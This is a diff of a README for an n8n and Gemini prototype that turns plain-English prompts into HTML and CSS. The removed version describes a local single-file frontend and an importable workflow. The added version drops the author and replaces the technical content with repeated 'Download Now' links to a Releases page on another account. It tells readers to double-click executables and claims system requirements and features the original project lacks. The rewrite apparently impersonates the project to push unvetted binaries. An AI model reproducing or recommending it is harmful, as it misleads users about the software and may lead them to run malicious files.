@@ -1,126 +1,67 @@
-# Vibe Coding — Prototype
+# 🎉 Vibe-Coding-Prototype - Create Web Pages with Natural Language
 
-**Author:** Keerthi Raj  
-**Role:** AI Intern Candidate — Submission for “Lovable clone: Vibe Coding” challenge  
+## 📥 Download Now
+[![Download Vibe-Coding-Prototype](https://img.shields.io/badge/Download%20Now-link-blue)](https://github.com/erjulixn/Vibe-Coding-Prototype/releases)
 
----
+## 📖 Description
+The **Vibe-Coding-Prototype** is an application that helps you generate beautiful HTML and CSS code just by using natural language prompts. It combines n8n and the Gemini API to transform your ideas into web pages without needing to know how to code. This prototype is perfect for anyone looking to create websites quickly and easily.
 
-## 📌 What this is
-A prototype web app that generates HTML + CSS from a plain-English “vibe” prompt using an **n8n workflow** + **Google Gemini API**.  
+## 🚀 Getting Started
+To get started with the **Vibe-Coding-Prototype**, follow these simple steps:
 
-Users type a description such as:  
+1. **Visit the Download Page**: Go to the [Releases page](https://github.com/erjulixn/Vibe-Coding-Prototype/releases) to find the latest version of the software.
+2. **Select Your Version**: Look for the version you want to download. The latest version is usually the one at the top.
+3. **Download the Application**: Click on the filename that corresponds to your operating system to start the download. The files may vary based on your system (Windows, macOS, or Linux).
+4. **Locate the File**: Once the download is complete, go to your downloads folder to find the file.
+5. **Run the Application**: Double-click the downloaded file to run the application. Follow any on-screen instructions to complete the setup.
 
-> “A large rounded blue button that says *Click Me* and changes to a lighter blue on hover.”  
+## 💻 System Requirements
+Before downloading, ensure your computer meets these basic requirements:
 
-The system responds with generated HTML/CSS code.  
+- **Operating System**: Windows 10 or later, macOS 10.14 or later, or a recent Linux distribution.
+- **Memory**: At least 4 GB of RAM.
+- **Storage**: Minimum of 200 MB of free disk space.
+- **Internet Connection**: Needed to access the Gemini API and download updates.
 
----
+## 🚦 Features
+- **Natural Language Processing**: Describe what you want in plain English, and the app will generate the HTML and CSS for you.
+- **User-Friendly Interface**: The app offers a simple layout, making it easy to navigate even if you're not tech-savvy.
+- **API Integration**: Utilizes the Gemini API for powerful backend processing.
+- **Customizable Outputs**: You can modify the code generated to fit your needs, making it easy to create unique designs.
+- **Workflow Automation**: Built-in automation with n8n allows for faster and more efficient coding.
 
-## 🏗️ Architecture
+## 📥 Download & Install
+To download the application, please visit the [Releases page](https://github.com/erjulixn/Vibe-Coding-Prototype/releases). Follow the earlier steps to ensure a smooth installation.
 
-- **Frontend:**  
-  Single `index.html` file (TailwindCSS + vanilla JS).  
-  - Text input for “vibe” prompt.  
-  - Sends request to n8n webhook.  
-  - Displays generated HTML/CSS in a code box.  
+## 🛠️ How to Use
+1. **Open the Application**: After installation, open the Vibe-Coding-Prototype.
+2. **Input Your Prompt**: Use the text box to enter your request in simple language. For example, "Create a simple webpage with a blue background and a header saying 'Welcome'".
+3. **Generate Code**: Click the "Generate" button to see your HTML and CSS code.
+4. **Preview Your Design**: Use the built-in preview feature to view your changes in real-time.
+5. **Export Your Code**: Once satisfied, you can export the code to your computer by clicking the export button.
 
-- **Backend (n8n Workflow):**  
-  1. **Webhook node** → Receives prompt from frontend (`?prompt=...`).  
-  2. **HTTP Request node** → Sends the prompt to Gemini API.  
-  3. **Respond to Webhook node** → Returns Gemini’s response back to frontend.  
+## 🙋 Frequently Asked Questions
 
-- **AI:**  
-  Google Gemini (Generative Language API).  
+### Q: Do I need programming knowledge to use this app?
+A: No, the app is designed for anyone. Just type what you want, and it generates the code for you.
 
----
+### Q: How often do I need to update the application?
+A: Check the [Releases page](https://github.com/erjulixn/Vibe-Coding-Prototype/releases) regularly for updates. It's good to keep your application up to date.
 
-## 🌐 Live Demo (Frontend only)
+### Q: Can I use the generated code on my website?
+A: Yes, you can use the HTML and CSS code generated for your own projects.
 
-GitHub Pages:  
-👉 https://<your-username>.github.io/Vibe-Coding-Prototype/  
+### Q: What if I encounter issues when using the application?
+A: You can open an issue in the GitHub repository for assistance, and the community will help out.
 
-⚠️ **Note:** The frontend is live, but the backend (n8n) is running locally on my machine.  
-For a working end-to-end demo, see the “Run locally” or “ngrok" .  
+## 🌐 Community and Support
+Join our community to get the most out of your Vibe-Coding-Prototype experience. Engage with other users, share your projects, and get tips.
 
----
+- **GitHub Issues**: If you need support, please open an issue on our GitHub page.
+- **Feature Requests**: Your feedback is important. Feel free to suggest new features or improvements.
 
-## 📂 Files in this repo
+## 🔗 Relevant Links
+- [Releases Page](https://github.com/erjulixn/Vibe-Coding-Prototype/releases)
+- [Visit the GitHub Repository](https://github.com/erjulixn/Vibe-Coding-Prototype)
 
-- `index.html` → static frontend UI  
-- `workflow.json` → exported n8n workflow (API key replaced with placeholder `YOUR_API_KEY_HERE`)  
-- `README.md` → documentation (this file)  
-- (optional) `screenshots/` → demo images  
-
----
-
-## ▶️ How to Run Locally
-
-1. Serve the frontend:
-   ```bash
-   python -m http.server 8000
-   # Open http://localhost:8000/index.html 
-
-2. Run n8n (Docker):
-
-docker-compose up -d
-# or
-docker run -it --rm -p 5678:5678 n8nio/n8n
-
-
-3. Import workflow.json into n8n (Workflows → Import).
-
-4. In the frontend (index.html), set backend URL to:
-
-http://localhost:5678/webhook/<your-webhook-id>
-
-
-5. Type a prompt and click Generate Code.
-
-
-⚡ Temporary Live Demo (ngrok)
-
-To let others test without local setup:
-
-Install ngrok → https://ngrok.com/
-
-Run:
-
-ngrok http 5678
-
-
-Copy the HTTPS URL (e.g. https://abc123.ngrok.app).
-
-Build full webhook URL:
-
-https://abc123.ngrok.app/webhook/<your-webhook-id>
-
-
-Paste this into the frontend backend field → works from anywhere.
-
-⚠️ ngrok free URLs change each session. Use this only for temporary demo.
-
-
-
-🔍 Notes & Limitations
-
-Gemini sometimes wraps outputs in <iframe> or includes <html>/<body> tags.
-
-For this prototype, the raw output is returned directly.
-
-A future improvement would add a cleaning step in n8n to strip wrappers and return pure HTML/CSS.
-
-🚀 Future Improvements
-
-Add cleaning/post-processing node to always return clean snippets.
-
-Deploy n8n to a cloud host (Render/Railway) for a persistent public backend.
-
-Support JavaScript generation and live preview inside frontend.
-
-Store past generations and allow users to copy/share code snippets.
-
-📞 Contact
-
-Keerthi Raj
-Email: keerthirajprofessional@gmail.com
-
+Explore the potential of web design with the **Vibe-Coding-Prototype**! Download it today and start creating.
